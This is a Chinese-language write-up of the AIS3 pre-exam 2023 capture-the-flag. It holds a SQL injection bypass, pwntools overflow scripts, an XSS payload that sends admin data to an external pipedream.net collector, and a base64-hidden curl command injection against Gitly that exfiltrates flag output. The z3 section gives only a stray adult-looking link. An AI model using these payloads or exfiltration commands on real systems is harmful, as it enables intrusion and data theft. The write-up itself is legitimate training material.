---
title: "AIS3 pre-exam 2023 Writeup"
date: 2023-06-24
# weight: 1
# aliases: ["/first"]
tags: ["CTF","AIS3"]
author: "Vincent55"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "AIS3 preexam 2023 的 writeup"
canonicalURL: "https://blog.vincent55.tw/posts/ais3preexam2023/"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: false
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://i.imgur.com/WNqYHa4.png" # image path/url
    alt: "AIS3preexam2023writeup" # alt text
    caption: "scoreboard" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
# editPost:
#     URL: "https://github.com/<path_to_repo>/content"
#     Text: "Suggest Changes" # edit text
#     appendFilePath: true # to append file path to Edit link
---

## 前言

這次打了個第 8 名，但這次暑假有事情了，不能去 qq。

## Web

### Login Panel

```js
app.post("/login", recaptcha.middleware.verify, (req, res) => {
  const { username, password } = req.body;
  db.get(
    `SELECT * FROM Users WHERE username = '${username}' AND password = '${password}'`,
    async (err, row) => {
      if (err)
        return res.redirect(`https://www.youtube.com/watch?v=dQw4w9WgXcQ`);
      if (!row) return res.redirect(`/login?msg=invalid_credentials`);
      if (row.username !== username) {
        // special case
        return res.redirect(`https://www.youtube.com/watch?v=E6jbBLrxY1U`);
      }
      if (req.recaptcha.error) {
        console.log(req.recaptcha.error);
        return res.redirect(`/login?msg=invalid_captcha`);
      }
      req.session.username = username;
      return res.redirect("/2fa");
    }
  );
});
```

觀察這個 API 可以看到有個明顯的 SQLi，可以使用 `admin` `' OR 1=1;-- ` 登入

之後發現 /dashboard 不用經過 2fa 驗證，所以直接去存取即可拿到 flag
`AIS3{' UNION SELECT 1, 1, 1, 1 WHERE ({condition})--}`

### E-Portfolio baby

用任意帳號登入後，經過測試發現可以用以下 XSS payload
`<svg><svg/onload=alert(1)>`

接下來發現 nonce 並沒有成功設定，以及 flag 是 admin 的密碼，所以我發現了 `/api/portfolio` 的內容會回傳 admin 的所有資訊，下一步就會讓 admin 去存取他，並將結果回傳回來

這個是最終 payload

```htmlembedded=
<svg><svg/onload='fetch("/api/portfolio").then(res=>res.text()).then(res=>fetch("https://eoudzw9ph3hhnmh.m.pipedream.net?ouo="+btoa(res)))' nonce="">
```

`AIS3{，，<img src=x onerror='fetch(...}`

### markToFiles

首先發現 pandoc 的這個參數可以自動 contain 本地的資源，但這個 deprecated 了，於是往下看到 --embed-resourse 跟 --standalone
![](https://hackmd.io/_uploads/Syp6dv1Hn.png)

透過看 [文件](https://pandoc.org/MANUAL.html#general-writer-options) 發現 --standalone 在 pdf, epub, epub3, fb2, docx, and odt 為 output format 時會自動開啟。

![](https://hackmd.io/_uploads/r1Mo_PyB2.png)

因此使用以下 payload 即可自動 contain 到本地的檔案

![](https://hackmd.io/_uploads/H1kPuDJH3.png)

`AIS3{R3@d1ng_D0cum3nt_1s_H31pfu1}`

### Gitly

這題是一個用 Vlang 撰寫的 GitHub/GitLab alternative [Gitly](https://github.com/vlang/gitly)，題目要我們找 zero day，又說預期解是 RCE，因此起手式就是把檔案 clone 下來後搜尋 os.execute

![](https://hackmd.io/_uploads/BJpzcD1S2.png)

接下來一個一個看有沒有可以 preauth 又可以達到 command inject 的地方

於是發現了這個 function 看起來很多洞

```
fn (r &Repo) git(command string) string {
	if command.contains('&') || command.contains(';') {
		return ''
	}

	command_with_path := '-C ${r.git_dir} ${command}'

	command_result := os.execute('git ${command_with_path}')
	command_exit_code := command_result.exit_code
	if command_exit_code != 0 {
		println('git error ${command_with_path} with ${command_exit_code} exit code out=${command_result.output}')

		return ''
	}

	return command_result.output.trim_space()
}
```

接下來看有哪些 route 使用了這個 function ，去搜尋 .git(

![](https://hackmd.io/_uploads/ryc59PJHn.png)

發現這個 function 看起來有料，只要透過 path 就可以碰到上述的 function

```
['/:user/:repository/raw/:branch_name/:path...']
pub fn (mut app App) handle_raw(username string, repo_name string, branch_name string, path string) vweb.Result {
	user := app.get_user_by_username(username) or { return app.not_found() }
	repo := app.find_repo_by_name_and_user_id(repo_name, user.id)

	if repo.id == 0 {
		return app.not_found()
	}

	// TODO: throw error when git returns non-zero status
	file_source := repo.git('--no-pager show ${branch_name}:${path}')

	return app.ok(file_source)
}
```

接下來構造 payload，因為 git function 有檔 `;` `&`，但這個非常好繞，使用 base64 即可

```sh
`echo Y3VybCBodHRwczovL2VvdWR6dzlwaDNoaG5taC5tLnBpcGVkcmVhbS5uZXQ/b3VvPWAvcmVhZGZsYWdg | base64 -d | sh`
```

最終 payload
`http://chals1.ais3.org:25565/admin/gitly/raw/master/%60echo%20Y3VybCBodHRwczovL2VvdWR6dzlwaDNoaG5taC5tLnBpcGVkcmVhbS5uZXQ/b3VvPWAvcmVhZGZsYWdg%20%7C%20base64%20-d%20%7C%20sh%60
`

`AIS3{so_many_bugs_so_easy_to_rce}`

## Pwn

### Simply Pwn

就是一個非常單純的 BOF

```python=
from pwn import *

#r = process("./pwn")
r = remote("chals1.ais3.org", 11111)
r.recvuntil(b": ")
payload = b"A"*79+p64(0x4017a9)
raw_input()
r.sendline(payload)
raw_input()
r.interactive()
```

`AIS3{5imP1e_Pwn_4_beGinn3rs!}`

### ManagementSystem

題目是一個 linked list 去實作儲存使用者資訊

研究了一下後發現刪除的地方是使用 gets ，因此可能有安全上的問題

```c
User *delete_user(User *head) {
    printf("Enter the index of the user you want to delete: ");
    char buffer[64];
    gets(buffer);

    int user_index;
    sscanf(buffer, "%d", &user_index);

    if (user_index <= 0) {
        printf("Invalid index.\n");
        return head;
    }

    if (user_index == 1) {
        User *user_to_delete = head;
        head = head->next;
        free(user_to_delete);
        return head;
    }

    User *previous = head;
    User *current = head->next;
    int count = 2;

    while (current != NULL) {
        if (count == user_index) {
            previous->next = current->next;
            free(current);
            return head;
        }

        previous = current;
        current = current->next;
        count++;
    }

    printf("User not found.\n");
    return head;
}
```

但全部蓋掉會 crash，因為下面還需要 stack 上的資訊，所以我們除了控制 return address ，還需要控制程式執行邏輯

在這個例子裡面，我們可以透過讓 user_index 小於 0，來讓程式提早結束，跳到我們想要的 address，避免存取到壞掉的 stack，導致 crash。

以下是 payload

```python=
from pwn import *

#r = process("./share/ms")
r = remote("chals1.ais3.org", 10003)
r.recvuntil(b"> ")
r.sendline(b"3")
r.recvuntil(b": ")

payload = p64(0x312d)+b"A"*8*12+p64(0x40131b)
#payload = b"-1"
raw_input()
r.sendline(payload)
raw_input()
r.interactive()
```

`FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}
`

## Reverse

### Simply Reverse

丟到 ida64 後發現主要的 function
![](https://hackmd.io/_uploads/ryG86vJH2.png)

可以寫對應的程式解出 flag

```
#include <iostream>

using namespace std;

int main()
{
    int enc[] = {138, 80, 146, 200, 6, 61, 91, 149, 182, 82, 27, 53, 130, 90, 234, 248, 148, 40, 114, 221, 212, 93, 227, 41, 186, 88, 82, 168, 100, 53, 129, 172, 10, 100, 0};

    for(int i = 0; i<35; i++){
        enc[i]-=8;
        cout << (((enc[i]>>((i ^ 9) & 3)|enc[i]<<(8 - ((i ^ 9) & 3)))) & 255 ^i)<< " ";

    }
}
```

`AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}`

### Flag Sleeper

觀察到關鍵函式有三個陣列叫 a b c
![](https://hackmd.io/_uploads/rk9oRDyr2.png)

可以先將 b c xor 起來後，再透過 a 來把 flag 順序排好，以下是排好的 function

```c++
#include<bits/stdc++.h>


using namespace std;

int main()
{
    // srand(3158064);
    // int vis[58] = {0};
    // int cnt =0;
    // while(cnt<=58){
    //     int now = rand()%52;
    //     if(!vis[now])
    //         cnt++;
    //     ++vis[now]
    // }

    // return 0;
    string mas_flag = "91p4h_g_3ghet8_14cl3kf_{15u1ar1A033racSm7I}_c_s?f8lJ";
    int rep[] = {10,12,28,7,38,31,47,44,42,35,48,30,21,11,17,16,34,40,33,39,41,9,22,4,6,20,19,46,23,45,26,0,15,3,8,43,14,5,2,27,49,1,51,36,37,24,25,50,32,13,29,18};
    string flag = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    for(int i = 0; i<54; i++){
        flag[rep[i]] = mas_flag[i];
    }
    cout << flag;

}
```

`AIS3{c143f9818a01_Ju5t_a_s1mple_fl4g_ch3ck3r_r1gh7?}`

### Vivid Emotion `>_<b`

發現是一個解方程式的題目，先用 ida 把 C code 匯出。
![](https://hackmd.io/_uploads/r1FWZO1Bn.png)

接下來把每個算式用 regex 拆出來，再生成 z3 solver 的 code，執行即可解題

https://pornhub.mov/ouo.html

## Misc

### robots

```python
from pwn import *

#connect to server
r = remote('chals1.ais3.org', 12348)    # remote binary

r.recvline()
r.recvline()
from time import sleep
for _ in range(30):
    res = r.recvline()
    ans = str(eval(res))
    print(res, ans)
    r.sendline(ans)
    sleep(0.5)


r.interactive()    #switch to interactive mode
```

## Crypto

### Fernet

```python
from cryptography.fernet import Fernet
import os
import base64
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2

leak_password = 'mysecretpassword'
flag = base64.b64decode('iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj')
salt = flag[:16]
flag = flag[16:]
key = PBKDF2(leak_password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256)
f = Fernet(base64.urlsafe_b64encode(key))
plain = f.decrypt(flag)
print(plain)
```
